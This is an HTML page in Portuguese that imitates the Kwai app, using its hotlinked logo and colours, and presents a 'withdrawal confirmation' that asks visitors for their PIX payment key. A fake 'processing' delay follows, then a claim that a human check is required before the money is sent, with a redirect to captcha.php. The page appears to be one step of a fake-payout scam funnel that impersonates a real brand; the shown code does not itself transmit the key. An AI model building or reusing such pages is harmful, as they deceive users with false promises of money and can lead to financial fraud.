<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmação de Saque</title>
    <link rel="stylesheet" href="style.css"> <!-- Mantendo as mesmas cores -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <main class="sacar-container">
        <div class="sacar-box">
            <img src="https://cdn-static.kwai.net/kos/s101/nlav11312/kwai-nuxt-pwa-pc-online/img/kwaiLogo@2.e9a678e.png" alt="Kwai Logo" class="logo">
            <h2>Confirme sua Chave PIX</h2>
            <p>Digite sua chave PIX para receber o pagamento.</p>
            <input type="text" id="pixKey" class="input-field" placeholder="Insira sua chave PIX">
            <button class="confirm-btn" onclick="confirmarPix()">CONTINUAR</button>
        </div>
    </main>

    <script>
        function confirmarPix() {
            const pixKey = document.getElementById("pixKey").value.trim();
            if (pixKey === "") {
                alert("Por favor, insira sua chave PIX.");
                return;
            }
            
            document.querySelector(".sacar-box").innerHTML = `
                <h2>Processando Pagamento</h2>
                <p>Verificando informações, aguarde...</p>
                <div class="loading-spinner"></div>
            `;

            setTimeout(() => {
                document.querySelector(".sacar-box").innerHTML = `
                    <h2>Precisamos confirmar que você é humano</h2>
                    <p>Verifique nosso CAPTCHA para enviarmos seu dinheiro agora.</p>
                    <button class="confirm-btn" onclick="window.location.href='captcha.php'">
                        VERIFICAR QUE SOU HUMANO
                    </button>
                `;
            }, 3000);
        }
    </script>

    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff7e6; /* Cor de fundo do Kwai */
            font-family: 'Inter', sans-serif;
        }

        .sacar-container {
            text-align: center;
        }

        .sacar-box {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .confirm-btn {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
            background: #ff6600; /* Cor do Kwai */
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: 700;
            cursor: pointer;
            font-size: 16px;
        }

        .confirm-btn:hover {
            background: #e65c00;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #ff6600;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
